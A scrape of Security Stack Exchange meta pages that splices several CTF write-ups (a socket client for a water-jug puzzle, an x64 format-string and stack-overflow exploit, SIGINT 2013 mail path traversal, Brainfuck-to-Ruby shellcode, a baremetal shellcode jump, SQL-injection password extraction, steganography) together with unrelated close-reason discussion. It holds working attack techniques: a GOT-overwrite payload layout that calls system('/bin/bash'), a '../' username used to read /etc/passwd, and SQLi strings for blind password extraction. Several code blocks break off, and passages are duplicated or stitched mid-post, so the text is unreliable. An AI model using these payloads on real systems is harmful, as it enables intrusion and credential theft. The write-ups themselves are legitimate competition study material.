<p>So first thing to do was to write a client that would be capable of communicating with the server, sending commands and reading its responses to send more commands. This turned out not to be as easy, as it's honestly been quite a while since I've been programming raw TCP sockets, so the most challenging first part was actually finding stable socket library that allows for enough low level control to script both server commands for which no response is read, and for those that needed to wait for server's response and parse from it new values. This was important, because the game timed out, if the protagonist would linger for too long, as <em>the walls and the roof were collapsing around him</em>. Each waiting for server's response meant more danger of the world around your character collapsing, and failing the mission.</p>

<p>After quite a bit of trouble finding suitable library, I've opted for what I know to be a good and stable library - Indy 10 for Delphi. Yes, the ancient one, but in perfect working order and I don't mind programming in Object Pascal (nice language to learn programming, and many probably started with it as well). Next part was to then script the optimal pouring solutions, and be able to complete each room with as few commands as possible (while also waiting for server's response only when really needed to, i.e. to read next challenge values).</p>

<p>&nbsp;&nbsp;&nbsp;<img src=""https://i.stack.imgur.com/v1wPl.png"" alt=""Die Hard Ping Pong""></p>

<p><strong>The pouring solution</strong>:</p>

<p>This seemed to be the most straightforward task, pure programming <em>fun</em> with addition and subtraction logic in a <em><code>while</code></em> loop. The code could look something along the lines of this pseudo code:</p>

<pre><code>  writeln('get red jug');
  writeln('get blue jug');
  //jugs need to be filled to inspect their size
  writeln('fill red jug');
  writeln('fill blue jug');
  writeln('look inscription');
  //read our input values
  Red:= ReadFromInput(RedJugSize);
  Blue:= ReadFromInput(BlueJugSize);
  Scale:= ReadFromInput(TargetWeight);
  //set string substitutes for server commands
  Jugs[Blue &gt;= Red]:= 'blue';
  Jugs[Blue &lt; Red]:= 'red';
  //empty big jug
  Vals[True]:= 0;
  writeln('empty ' + Jugs[True] + ' jug');
  Vals[False]:= 0;
  //now loop the pouring between jugs until one of them matches the scale
  while !((Vals[True] = Scale) or (Vals[False] = Scale)) {
    //fill small jug
    Vals[False]:= Min(Red, Blue); 
    writeln('fill ' + Jugs[False] + ' jug');
    //pour small into big jug
    Vals[True]:= Vals[True] + Min(Red, Blue);
    writeln('pour ' + Jugs[False] + ' jug into ' + Jugs[True] + ' jug');
    //get difference in small jug
    Vals[False]:= Vals[True] - Max(Red, Blue);
    if Vals[True] &gt; Max(Red, Blue)
    then Vals[True]:= Max(Red, Blue);
    if Vals[False] &lt; 0 then Vals[False]:= 0;
    //empty big jug and pour small one into big one
    if (Vals[False] &gt; 0) {
      Vals[True]:= Vals[False];
      writeln('empty ' + Jugs[True] + ' jug');
      writeln('pour ' + Jugs[False] + ' jug into ' + Jugs[True] + ' jug');
    }
  }
  //decide which jug to put on scale, drop the other one
  writeln('put ' + Jugs[Vals[True] = Scale] + ' jug onto scale');
  writeln('drop ' + Jugs[Vals[True] != Scale] + ' jug');
  //progress to the next room
  writeln('n');
</code></pre>

<p>Now this algorithm was obviously later much optimized, but the gist of it is here:</p>

<ul>
<li>exit <code>while</code> loop as soon as you can, when one of the jugs is filled with required quantity</li>
<li>find shortcuts to poring solutions (i.e. is <code>Abs(Vals[True]-Vals[False])=Scale</code>)</li>
<li>decide, whether to switch jugs for pouring (i.e. is <code>Scale mod Vals[True] &gt; Scale mod Vals[False]</code>)</li>
<li>only wait for server response when absolutely necessary (two <code>write</code> commands, one doesn't wait)</li>
<li>...</li>
</ul>

<p><strong>The result</strong>:</p>

<p>Sadly, I wasn't able to complete all the required challenges to collect the flag. The best result I got was <strong>19 rooms solved</strong> (if the number of them was 20, then that's so close), but the code suffered from some bugs (basically, I've forgotten to include <code>&gt;=</code> where only <code>&gt;</code> was in the string substitution for the <code>blue jug</code>, resulting in hard to spot errors in mixing solutions with all the server's output, if the required scale value was equal to how much water blue jug holds, basically issuing a command <code>put jug onto scale</code> instead of <code>put blue jug onto scale</code>) that took too much time to identify, there were some other minor inefficiencies in decision where to wait for server's response and where not, and the late hours didn't help either. All of it resulted in nearly getting there, but not quite. Frustrating!</p>

<p>Still, the challenge was fun, I've refreshed my memory on raw socket programming, and given a bit more time to polish out the rough edges in my code, or even starting over without the burden of finding comfortable and powerful enough socket library, who knows, maybe I'd be able to collect the 2 points flag.</p>

<p><strong>Observations</strong>: It turns out there was nothing wrong with the application I wrote, and the ability to complete the challenge depended highly on internet speed (i.e. ping speed or distance to the server). Some other teams have been complaining about that fact as well (see for example comments to the <a href=""http://f00l.de/blog/def-con-ctf-2013-diehard/"" rel=""nofollow noreferrer"">F00ls Bl0g write-up</a>) and they still can't make flag collecting <em>python</em> scripts to work for them, and neither can I. </p>

<p>For our tries, I've compiled a <em>Win32</em> executable and uploaded it to my web server while the challenge lasted, but others that tried it didn't have much luck with it either (@D3C4FF, @Manishearth and others, none of us from US where the server was), but we did suspect there must be something amiss with the network lag, as the application progressed really fast where no server response was needed, and pretty slow where it was. Oh well...</p>

Following up a Question,"<p>As Rory said, our discussion around this was going on during the same time frame as the site design and graduation.

<blockquote>
<p>IT Security Stack Exchange is for Information Security professionals to discuss protecting assets from threats and vulnerabilities. Topics include, but are not limited to:</p>

<p>The last two topics are really the core of what you're asking. Incident Response being a largely soft topic, with technical aspects depending on the incident. Then the last is explicitly allowing physical security topics.

<p>The reason for the &quot;IT Security&quot; branding is exactly what Rory hinted at. By the time we had the discussion explicitly allowing physical security questions the site design had already gone through and either had gone live or was within a day or two of going live.

Why no negative reputation?,"<h1>Exploitation 4 (annyong)</h1>

<p><strong>I (randomdude) didn't get this challenge solved</strong>, but I thought I'd share the progress I made on it. I'm also going to share some of the dead-ends I found myself investigating (hopefully the'll be useful as academic points).</p>

<p>The challenge gives us a binary and a server on which the binary is listening. We crack open the binary in IDA (<a href=""https://www.hex-rays.com/products/ida/support/download.shtml"" rel=""nofollow noreferrer"">download</a>), and after a quick look around, we find this: </p>

<p><img src=""https://i.stack.imgur.com/tCWpz.png"" alt=""IDA screenshot""></p>

<p>IDA makes the function pretty easy to read. The first thing that I saw in the function is a buffer overflow - the 'sub esp, 0x810' allocates 810 bytes of stack space for locals, but the value 0x900 is passed to fgets(). My first instinct was to attempt exploit of this - looks like a trivial stack buffer overflow, right?</p>

<p>So I set up a system and run the binary on it under GDB. I connect and send a lot of data to the daemon, and what do we get?</p>

<p>Woohoo, a crash! The data that I sent was along the lines of '_aaa_aab_aac', which makes it easy to see which registers were overwritten. We've obviously got control of RIP and RBP, which are pretty important.
What's happened here is that the call to fgets has corrupted the return address from sub_108C on the stack, and once sub_108C returns, it uses overwritten data as RIP.
So, being old-school, I thought I was home and dry at this point. I set RIP to the stack address and put some shellcode on the stack, aaand - nothing. Well, just a segfault.</p>

<p>So it seems that since I last did this (yes, quite some time ago), people started marking their stacks as non-executable, which is causing this access violation. Things aren't quite as simple as we thought, but our control of these registers via the buffer overflow will still be useful.</p>

<p>So we go back to the code and take a look at the code again, and this time, we look closely at the printf() call. It's only passing one argument! That's a format string bug which should lead to code execution (if you need a quick primer on exploitation of format string vulns, see <a href=""https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf"" rel=""nofollow noreferrer"">this pdf</a>). Looking at the function in the supplied binary, though, we can see that input containing the character 'n' is rejected, meaning we can't use the traditional '%n' method of exploitation.</p>

<p>Perhaps we can use the buffer overflow we found earlier to circumvent this check. Since the buffer overflow gives us control of RIP, we could use it to jump directly to loc_10ED - the block of code which calls printf() - ignoring the check entirely. The sequence of events is the following:</p>

<p>1) fgets is called, is returned a very long string which contains an 'n' character
2) fgets leaves the area after our stack buffer corrupted
3) strchr() is called, and the function writes ""I don't think so"" and refuses to printf()
4) control returns to loc_1113, which then notes that the stack-based local var_4 is nonzeo and thus returns
5) a value from the corrupt stack is transferred in to RIP. Since we control this value, we set it to the location of loc_10ED.
6) printf() is called with the recieved data.</p>

<p>Sorted. So we set this up with GDB and woohoo - it works, in that we now get to printf() an unrestricted attacker-supplied string! </p>

<p>So next we need to exploit the (now unrestricted) heap overflow. The first instinct I had was to modify the function we are running, adding code to give us a shell. However, this is not the easy answer it sounds, because the code section is mapped read-only. We could generate a ROP chain to get to what we want (perhaps the better option, in retrospect), but instead I decided to use a ""%n""-style 4-byte overwrite to set a function pointer in the GOT (see <a href=""https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/"" rel=""nofollow noreferrer"">here</a> for an explanation of the GOT and PLT). We don't need any complex payload - since stdin/out of the target binary are redirected over a socket, all we need to is to system(""/bin/bash"") to get a remote shell.</p>

<p>Looking at the provided binary, we can see that after printf is called, fgets() is called again with the same buffer as an argument. If we start the payload of our data with ""/bin/bash"", then we can change the fgets entry in the PLT to the address of system(), and we're sorted. So we have the following additional steps in our exploit, to occur after the printf():</p>

<p>7) a k-rad format string payload causes the fgets() function pointer to be changed to a pointer to system()
8) control passes to loc_1113, but (since we corrupted the stack) we ensure that this time, var_4 contains zero, causing the target not to exit, but to call fgets() again
9) the target attempts to call fgets, passing it a buffer filled with our data. Instead, system() is called.
10) a shell!</p>

<p>However, there's an important aspect I've skimmed over so far - we must discover some locations in memory, since memory layout is randomised on each load of the target. We need:</p>

<ul>
<li>The location that our stack buffer will be (so we can use an offset of that for our new stack after printf, thus controlling var_4)</li>
<li>The location of loc_10ED (so we can jump to it in step 8)</li>
<li>The location of system().</li>
</ul>

<p>These are easy to get, since we have a format string vuln - we can simply pass %p to glean values straight from the stack (and indeed, a few registers). We send a message comprising the string ""%08lx"" repeated, which yields that a pointer to a value on the stack as the fourth address, a pointer to somewhere in the code segment as the 283rd, and a return address in to libc (actually _start_main()) as the 267th. Our pointers don't need to be exact, since the stack and code are always aligned at a page boundary. We can find the location of loc_10ED by masking off the lower 2 bytes and adding 0x10ED, and the location of system() by adding a constant to the _start_main return address. Ace.</p>

<p>So our attack now comprises two steps:</p>

<p>1) Send one message, of a size too small to trigger the overflow, containing a number of ""0x%08lx"". This will leak enough information about the memory layout to perform the real attack.
2) trigger the overflow, use this to trigger a format string vuln without 'n' filtering, and overwrite the fgets() pointer.</p>

<p>So far, I've glossed over the 'exploit the format string vuln' stage. Remember that the first few args are passed in registers on x64 (remove then using '%c', since we need to precisely control how many characters are written so we can use %n as a write primitive), and use the time-honoured ""%XXXu%n"" to write data. Since libc seems to silently fail on large %u values, we use a max of 5000, and provide multiples - so if we wanted to set the memory location 10020, we'd use ""%5000u%5000u%20u%n"".
I ended up doing three overwrites to set a 64bit value 16 bits at a time (leaving the top 16 bits blank). The first overflow sets the bottom 16bits (making the middle 16 bits zero by necessity), and the second sets the middle 16, and the third the next 16. Unfortunately this means that the bottom 16bits must be less than the next 16, which must be less than the next 16. It was only after the context closed that I discovered that an 8bit write was possible, which would've made this much easier :D</p>

<p>So, after all that, our second-stage overflow ends up looking like this:</p>

<p>/bin/bash # [%c%c%c%c%c to use up the register args] [%5000u (repeat as neccessary)] [%..u] [%n to perform the PLT overwrite] [..] [nonzero value for first ebp-4] [..] [zero value for second ebp-4] [..] [new EBP for use after overflow] [new RIP - ie, pointer to loc_10ED] [args to pass to printf] [..]</p>

<p>I've only shown one overwrite in the format-string for clarity.</p>

<p>Amazingly, when I ran it against my Kali install, it works fine! It didn't, however, work against the target machine hosted by the CTF organisers. I think this is because of the hardcoded offset to system(). Unfortunately at this point I gave up and went to bed (having consumed enough caffeine to cause seismic activity). If I'd have worked out what build of libc the server was running, or simply tried all versions from common distributions, I would've been able to use that to find the correct offset to system() and thus get a shell. Note that I already had the location of libc in memory so, really, I had the hard part done.</p>

<p>Here's a huge-ass lump of incredibly poor C# which should work against Kali 1.0.3 32bit. As I say, it's poorly-written, horrible and generally bad! This isn't how I normally code!</p>

<p>The kind of questions we want to close are the ones that are unsalvageable, and the real problem isn't that they're about breaking security but that the asker doesn't have a clue and what he's asking is way beyond his reach.</p>

<p>Script kiddie questions make the bulk of these way-over-your-head-and-we-can't-help-you questions, but we do also get the occasional “how do I make my system secure?” question with no information about threats, assets, etc. even in layman language.</p>

Can this close reason be improved?,"<p>Absolutely a false dichotomy. In fact, usability and security are almost the same exact thing. Everyone should read <a href=""http://sid.toolness.org/ch13yee.pdf"" rel=""nofollow noreferrer"">Guidelines and Strategies for Secure Interaction Design</a>. Here's a snip:</p>
<blockquote>
<p>At the heart of the apparent conflict between security and usability is the idea that security makes operations harder, yet usability makes operations easier. Although this is usually true, it’s imprecise. Security isn’t about making all operations difficult; it’s about restricting access to operations with undesirable effects. Usability isn’t about making all operations easy, either; it’s about improving access to operations with desirable effects.</p>
<p>Tension between the two arises to the extent that a system is unable to determine whether a particular result is desirable. Security and usability come into harmony when a system correctly interprets the user’s desires.</p>
</blockquote>
<p>The interplay of usability and security is core to probably every design question that's asked on this site, so a canonical question/answer for it does not make sense to me -- you can't canonicalize such a core concept.</p>
",<discussion><close-reasons>,6,,62
Can this close reason be improved?,"<p>Nope.  I do not think this is a good direction.  Usable security is an entire subfield of computer security.  It's a rich area with many complexities, challenges, and techniques.  There's no way a single page is going to address everything within that domain.  Treating every question that touches on usability and security as out of scope would be unreasonable and harmful to the site.</p>

<p>If you still are in favor if this, I suggest you start by trying to create one question and posting some answers, then when you have that, come back with a more specific proposal.  Nothing stops you from creating a new question now that you think addresses common elements.  (Personally, I think it's going to be hard to create a single specific question that is both narrowly scoped enough to be a good fit for this site and yet broad enough for what you have in mind -- but feel free to give it a try and see what you come up with.  Maybe when I see something specific, you'll change my mind; I'll try to keep an open mind.)  Once you have a specific question and some concrete answers, then if you still think your proposal is a good idea, you could come back to us with a specific proposal about what questions you think should be marked as a duplicate of that one, and we could discuss it by looking at the specific questions.  But at this point, I think it would be premature to adopt your proposal.</p>

"SIGINT CTF 2013 starts Friday 5 July 16:00 GMT (ended, including write-ups!)","<p>Here's a write-up for the challenges that I participated in enough to follow the solution. We had several good team efforts, not all of these are my own work.</p>

<h1>11. mail</h1>

<p>This is a file upload service over email. We can send commands: <code>signup</code>, <code>list</code>, <code>put</code>, <code>get</code>, <code>delete</code>, <code>share</code>. The user name is taken from the email's <code>From:</code> address.</p>

<p>Looking at the server source code, we can see that user names are not validated. The directory of a user whose address is <code>username@example.com</code> is <code>example.com___username</code>. If you want to receive the replies to your commands, you need to use a domain where you can receive mail, but many domains give you some variation on the username, which allows you to append interesting suffixes to the user directory. In particular, many servers (including GMail) redirect all addresses of the form <code>username+suffix@example.com</code> to the main <code>username@example.com</code> address. Alternatively, you can use a disposable email service such as <a href=""http://mailinator.com"" rel=""nofollow"">http://mailinator.com</a>.</p>

<p>The main trick is to use <code>../</code> in the user name to escape our user directory. For example, supposing you are <code>eve@gmail.com</code>, sign up as <code>eve+@gmail.com</code>. This creates the user directory <code>gmail.com___eve+</code>. You can then use usernames of the form <code>eve+/../something</code> to access directories on the server of the form <code>gmail.com___eve+/../something</code>. For example, you can access the account of <code>alice@example.com</code> via <code>eve+/../example.com___alice@gmail.com</code>.</p>

<p>Armed with this trick, we explored the filesystem. There were many red herrings, left either by the contest organizers or by other contestants. The addresses mentioned in the problem description (<code>hans@ck.er</code> and <code>sales@cloud.cloud</code>) both had an account, as did <code>admin@b3.ctf.sigint.ccc.de</code> and <code>test@b3.ctf.sigint.ccc.de</code>. We could access the user list by sending the <code>list</code> command as <code>eve+/..@gmail.com</code>. None of these led to the flag, though.</p>

<p>Finally Manishearth thought of looking at <code>/etc/passwd</code> (<code>get passwd</code> from <code>eve+/../../../../etc@gmail.com</code>), where the flag was hiding in the Gecos field of the <code>challenge</code> user.</p>

<h1>14. punchcard</h1>

<p>We get a images of punchcards. The first step is to parse them into text — write a software punchcard reader. These are <a href=""http://en.wikipedia.org/wiki/Punch_card#IBM_80-column_punched_card_formats_and_character_codes"" rel=""nofollow"">IBM 80-column punched cards</a> and the encoding turns out to be EBCDIC.</p>

<h1>16. rsa</h1>

<p>We get an <code>authorized_keys</code> file and a Python script that generates an SSH key pair. The key is generated using a simple pseudorandom generator that uses the time as the seed. We have the public key in <code>authorized_keys</code> file, so we need to find the seed time that corresponds to that public key.</p>

<p>First, the PRNG is extremely slow as written because it's computing insanely large numbers. Only the lowest-order bits of these numbers are ever used, so we can truncate them. 32 bits are enough and make the speed sufficient.</p>

<p>Second, extract the modulus from the SSH public key.</p>

<pre><code>ssh-keygen -m PKCS8 -e -f authorized_keys |
sed -e '1d' -e '$d' |
hexdump -C1
</code></pre>

<p>This plus a bit of manual ASN.1 decoding gives us a 1024-bit modulus and the public exponent 65537.</p>

<p>Now we brute-force the seed, working backwards from the starting time of the contest.</p>

<h1>17. satisfaction</h1>

<p>The server reads a Brainfuck program and a signature. It computes the signature of the program; if the signature is valid, the brainfuck program is executed. It must output a Ruby snippet which is executed through <code>eval</code>.</p>

<p>Let's look at the signature first. <code>sig</code> is the signature read from the input, and <code>$d</code> and <code>$n</code> are unknown.</p>

<pre><code>crc = crc32(code)
test = crc.to_bn.mod_exp($d, $n)
return sig == test
</code></pre>

<p>Without knowing <code>$d</code> and <code>$n</code>, we cannot find the correct <code>sig</code> value! Except, that is, if <code>crc</code> is 0 or 1, in which case the signature is 0 or 1. So we will strive to produce code whose CRC is 0 or 1.</p>

<p>The Brainfuck code must output a Ruby shellcode. This shellcode is executed through <code>eval</code>. Its standard input and standard output are not connected to the network socket. Furthermore, a look at the Brainfuck interpreter shows that the Brainfuck code must execute for no more than 1000 steps and has access to 100 memory cells. After a few false tries, I settled on <code>client.puts`#{client.gets}`</code>, which is produced by this simple Brainfuck code (which we'll strip of its whitespace before submission):</p>

<p>Now we need to pad this program so that the resulting CRC is 0 or 1. We're only allowed to use the characters <code>-+&lt;&gt;[].</code> — active Brainfuck characters plus space. I wrote a program to compute CRC values and brute-force a padding with a desired CRC. Since there are 7 possible characters (skipping <code>.</code> which might result in broken output), and 2³¹ ≈ 7¹¹, we can expect that there is a 12-character padding that produces a suitable value.</p>

<h1>18. PROtocol</h1>

<p>We're told to connect to a certain IP and port. But it's not tcp and not udp. MMavipc (I think) observed that there was a response on <a href=""http://en.wikipedia.org/wiki/SCTP"" rel=""nofollow"">SCTP</a> port 1024. On every connection, <code>socat - SCTP-CONNECT:188.40.147.103:1024</code> produces a string like the following:</p>

<pre><code>945c7bceb37fTa27dadbd7cI9cde8d43I5286153c94a16f3da3df0cf3819152a509952d50fdb_ad23G81ec5489bf62ced620N0Sa02c
</code></pre>

<p>Some observations:</p>

<ul>
<li>The server doesn't seem to read any input, it emits a 107-byte string per connection every time.</li>
<li>The 107-byte string is always a permutation of the same string, which contains <code>SIGINT_</code> and 100 hexadecimal digits.</li>
<li>The permutation depends on the time: it's different at almost every connection, except that two near-simultaneous connections result in the same string.</li>
</ul>

<p>MMavipc made the second crucial observation that the packets need to be reordered by SID (stream identifier). So I looked at one connection with <code>tcpdump</code> and saw that I was receiving 1-byte packets out of order, like this:</p>

<pre><code>    1) [DATA] (B)(E) [TSN: 1096613863] [SID: 74] [SSEQ 0] [PPID 0x0] [Payload:        0x0000:  62                                       b
    1) [DATA] (B)(E) [TSN: 1096613863] [SID: 74] [SSEQ 0] [PPID 0x0] [Payload:        0x0000:  62                                       b
    2) [DATA] (B)(E) [TSN: 1096613864] [SID: 60] [SSEQ 0] [PPID 0x0] [Payload:        0x0000:  37                                       7
    3) [DATA] (B)(E) [TSN: 1096613865] [SID: 10] [SSEQ 0] [PPID 0x0] [Payload:        0x0000:  33                                       3
</code></pre>

<p>Note that in this trace one packet was duplicated, it needs to be included only once. From this trace (which should have all SIDs from 0 to 106) sorting the packets and extracting the payloads is an easy one-liner:</p>

<pre><code>$ &lt;capture sort -u -k7n | perl -ane 'print chr(hex($F[13]))'; echo

<p>So there was a <code>lighttpd</code> server on port 80 (and an <code>index.html</code> file). Poking around on this server, we found nothing. (This was a red herring)</p>
<p>I  was trying to see if I could fool <code>urlparse</code> into picking up the wrong <code>netloc</code>. An interesting case was a URL like <code>example.com://localhost</code>. It does indeed fool <code>urlparse</code>, and at the same time it fetches <code>http://example.com/localhost</code> in Chrome. However, <code>urllib2</code> coughs up on it. It seemed like <code>urlparse</code> and <code>urllib2</code> had the same way of looking at URLs. Bummer.</p>

<h1>baremetal</h1>

<p><a href=""https://security.stackexchange.com/users/9377/lynks"">Lynks</a> and I worked on this challenge as a team.</p>

<p>We were given an executable file named <code>baremetal</code>, an IP address, and a port.</p>

<pre><code>$ file baremetal
baremetal: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, stripped
</code></pre>

<p>First, we looked for strings in the file and ran it (in a safe environment).</p>

<pre><code>$ strings baremetal
~Fh
baremetal online
Sequence OK
Bad Sequence
$ ./baremetal
baremetal online
&lt;here it pauses so we send the program a random line of data&gt;
Bad Sequence
$ strace ./baremetal
execve(""./baremetal"", [""./baremetal""], [/* 40 vars */]) = 0
[ Process PID=16342 runs in 32 bit mode. ]
write(1, ""baremetal online\n"", 17baremetal online
)      = 17
read(0, randomdata
""randomdata\n"", 61)             = 11
write(1, ""Bad Sequence\n"", 13Bad Sequence
)          = 13
_exit(0)                                = ?
+++ exited with 0 +++
</code></pre>

<p>The program reads 61 bytes from stdin. We determined that the same program was being hosted on the port/IP address that we were given.</p>

<pre><code>$ netcat &lt;ip&gt; &lt;port&gt;
baremetal online
&lt;sent some random data&gt;
Bad Sequence
</code></pre>

<p>We disassembled the program's .text section and mapped it out a bit.</p>

<p>We determined that in order to get the program to print ""Sequence OK"", we had to send it a string that was at least 32 bytes in length and had a byte-sum of 7911. The data that the program read from stdin was loaded into memory at address <code>0x80491c8</code>. At address <code>0x80480a5</code>, the program loads four bytes into memory at address <code>0x8049204</code>, 60 bytes above the address at which the data read from stdin is loaded into memory, for execution right before ""Sequence OK"" is printed (address <code>0x80480f9</code>).</p>

<pre><code>804809f:   8d 05 04 92 04 08    lea    0x8049204,%eax
80480a5:   c7 00 47 47 ff e7    movl   $0xe7ff4747,(%eax) ; loading the instructions into memory
</code></pre>

<p>Here are the four bytes that are executed:</p>

<pre><code>8049204:   46      inc    %edi
8049205:   46      inc    %edi
8049206:   ff e7   jmp    *%edi
</code></pre>

<p>Since 61 bytes are read from stdin, we are able to overwrite one byte. Naturally, we looked for ways to execute the rest of the data read from stdin. We generated a list of possibilities and realized that if we overwrote the first byte with <code>0x97</code>, the instructions would become</p>

<pre><code>8049204:   97      mov    %eax,%edi
8049205:   46      inc    %edi
8049206:   ff e7   jmp    *%edi
</code></pre>

<p>It just so happened that the <code>%eax</code> register contained the start address of the data read from stdin. <code>%edi</code> was incremented before the jump so we were able to jump to the second byte of our data. We wrote a script to generate some simple <code>exec /bin/sh</code> shellcode.</p>

<pre><code>#!/bin/bash

<p>We determined that in order to get the program to print ""Sequence OK"", we had to send it a string that was at least 32 bytes in length and had a byte-sum of 7911. The data that the program read from stdin was loaded into memory at address <code>0x80491c8</code>. At address <code>0x80480a5</code>, the program loads four bytes into memory at address <code>0x8049204</code>, 60 bytes above the address at which the data read from stdin is loaded into memory, for execution right before ""Sequence OK"" is printed (address <code>0x80480f9</code>).</p>

<pre><code>804809f:   8d 05 04 92 04 08    lea    0x8049204,%eax
80480a5:   c7 00 47 47 ff e7    movl   $0xe7ff4747,(%eax) ; loading the instructions into memory
</code></pre>

<p>Here are the four bytes that are executed:</p>

<pre><code>8049204:   46      inc    %edi
8049205:   46      inc    %edi
8049206:   ff e7   jmp    *%edi
</code></pre>

<p>Since 61 bytes are read from stdin, we are able to overwrite one byte. Naturally, we looked for ways to execute the rest of the data read from stdin. We generated a list of possibilities and realized that if we overwrote the first byte with <code>0x97</code>, the instructions would become</p>

<pre><code>8049204:   97      mov    %eax,%edi
8049205:   46      inc    %edi
8049206:   ff e7   jmp    *%edi
</code></pre>

<p>It just so happened that the <code>%eax</code> register contained the start address of the data read from stdin. <code>%edi</code> was incremented before the jump so we were able to jump to the second byte of our data. We wrote a script to generate some simple <code>exec /bin/sh</code> shellcode.</p>

<pre><code>#!/bin/bash
# read mem 0x80491c8

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src=""https://i.stack.imgur.com/5MK8f.png"" alt=""Web100 - authorisation level 3""></p>

<p>The first authorisation page asked for a <code>username</code> and <code>password</code> only, and the input was not sanitized in any way whatsoever. This meant we could try with the simplest of SQL injections: <code>"" or 1=1 or ""</code> on any of the fields (or both) and got out the username <code>admin1</code> when presented with the 2nd level authorisation form:</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src=""https://i.stack.imgur.com/pGtRb.png"" alt=""Hello, admin1""></p>

<p>But the authorisation process was still able to determine that we cheated, so we'll need to actually extract the password, to be able to continue to level 3 authorisation. The <code>robots.txt</code> file published at the web root gave a few hints: </p>

<pre><code>User-agent: *
Disallow: /forgot_username_and_password.txt 
</code></pre>

<p>And the <a href=""http://a1galaxy.tasks.ufoctf.ru/forgot_username_and_password.txt"" rel=""nofollow noreferrer"">/forgot_username_and_password.txt</a> location let us know the length of the password:</p>

<pre><code>username: ******
password: **********************
</code></pre>

<p>So the password length is 22 characters long. If we had to brute-force for all the possible values in the character space of 52 possible <code>[a..Z]</code> values (educated guess, but it could have been more than that), that would be 52<sup>22</sup> values, and clearly too many to test on. But, since the input on level 1 wasn't sanitized at all, this wasn't too difficult and meant we could test for existence of a single character at a certain password position using <code>substr</code> SQLite function (we've determined what database engine is running the backend based on commands it was accepting). So we could simply iterate through all 22 positions and test for these <code>(52/2)+1</code> or 27 values, as it could be further optimized to match lowercase values only, and later determine with a single injection, if the character tested was upper or lowercase. This would look something like this: <code>"" or (1=1 and lower(substr(password,1,1)) == ""c"") or ""</code>.</p>

<p>If the login form would let us pass (and report an error it was hacked), that means we've determined the character for the <code>n</code>-th position, leaving us only at most 27*22 values to try on (or 594 tests, which is obviously a lot better than 52<sup>22</sup>).</p>

<p>The first password was successfully extracted and turned out to be: <code>MyPasswordIsNotTheFlag</code>.</p>

<p>The second password (level 2 authorisation) was somewhat easier. While the input was sanitized, it was rather poorly so, and let us determine the string matching in its internal SQL query was based on the <code>LIKE</code> operator. This was again determined by <a href=""https://security.stackexchange.com/users/10414/p-h"">@p____h</a>. I've run a script to iterate through all possible values in the 62-letter address space (<code>[0..9,a..Z]</code>), using SQL injections ending the sought after password with <code>%</code> (matches any value that starts with previous characters when <code>LIKE</code> operator is used), for example: <code>0a%</code>.</p>

<p>The second password turned out to be really short: <code>0x42</code></p>

<p>But, we were only left with roughly 15 minutes to extract level 3 password, and no idea how to test against possible values yet. I've determined it must be a digits only password, and that it's most likely 12 digits long. This was due to the level 3 auth producing different error (<em>""level 3 password mismatch""</em>, instead of <em>""following errors occurred: wrong level 3 password 1, wrong level 3 password 2""</em>) when entering <code>0</code> or a non-integer value for these two input fields for password 3 (indicating the input matching defaults to <code>0</code> where type conversion fails), and when entering an integer value longer than 12 digits. In fact, I was able to narrow this down even further by establishing the value must be smaller than <code>444444444444</code> (blind test), but is bigger than <code>100000000000</code>. This would still leave us with too many possible values to try and the time run out.</p>

<p>So the login info successfully extracted was:</p>

<pre><code>username: admin1
level1_password: MyPasswordIsNotTheFlag
level2_password: 0x42
</code></pre>

<p>Still, for having roughly 2 times half an hour of spare time (Global economic crisis weekends FTW! - shuffle letters to FTW to get my intended meaning), and <a href=""https://security.stackexchange.com/users/10414/p-h"">@p____h</a> in the meantime working on other challenges, I think we did fairly well. We'll try better next time. ;)</p>

<p>We have a GIF that contains three 250x250 images, one mostly red, one mostly green, one mostly blue. Careful examination reveals that the first line of each gif isn't perfectly uniform but has #0000fe bytes interlaced with the #0000ff bytes (mutatis mutandis for the green and blue image). We xor the images together, tempted by the fact that at the beginning the \xff's and \xfe's mix with \x00's of the other image.</p>

xor a-[012].pnm &gt;xor.pnm

<p>Instead of xoring, we could extract the bits separately in the next step, then take one bit from each image in rotation. I find xoring simpler.</p>

<p>Now we extract bits from the result, interpreting the byte value as \xff as a 1 bit and the byte value \xfe as a 0 bit.</p>

<h2>cryptoMAX [crypto, joy, 100]</h2>

<p>We get an encoded image and an encoding script.</p>

<p>The encoding script iterates over the pixels. It reads each pixel as an RGB triple, masks some bits, and adds the masked R, G and B values together and multiples the sum by a constant. The resulting range is 0..255. The masking and sum cannot be reversed. Also the image is transposed (horizontal swapped with vertical, which is a rotated mirror image).</p>

<p>The encoded image is a raw bitmap. It's 90000 bytes long, so we can guess that the image is 300×300. Let's convert it to a common image format.</p>

<pre><code>{ echo P5; echo 300 300; echo 255; cat img.encode; } | pnmtopng &gt;img.png

<p>The alpha channels consist of bytes <code>\xff</code> and <code>\xfb</code> (except <code>empty.png</code> which is all zero), with the trailing bytes being <code>\xff</code>. Let's pack them into 8-bit bytes. I initially chose <code>\xff</code> to be the 0, but it turns out to be 1.</p>

<p>We have an XDP file which encodes a PDF file. At the bottom of the PDF file is a comment with the password of the PDF file. <a href=""https://security.stackexchange.com/users/10414/p-h"">p____h</a> provided a decompressed version. There's a string in there that looks like a flag, but this isn't it. There's also some Javascript code, encoded with hexadecimal escapes. Here it is after some light reformatting.</p>

<pre><code>var resp = app.response({cQuestion:""Enter password"", cTitle:""Password"",});
if (resp == this.saveXML()) {
    var s = ""c0ffeed5838de68871c45374f04c865a"";
    var t = """" + this.resolveNode(""/flagKey"");
    var n = ""c0ffee"";
    var baz = 0;
    for (var i=6; i&lt;s.length; i+=2) {
        baz = parseInt(s.substr(i,2),16) ^ t.charCodeAt(i/2-3);

<p><code>flagKey</code> is <code>CXrgfTA4sBXz9SBehVirA4A61zOgkXbm</code>. Executing this JavaScript code (minus password check) with <code>t</code> set to the <code>flagKey</code> field of the XFA data yields <code>c0ffee96dbff81ee25856707b214fc63</code>, which is still not the flag.
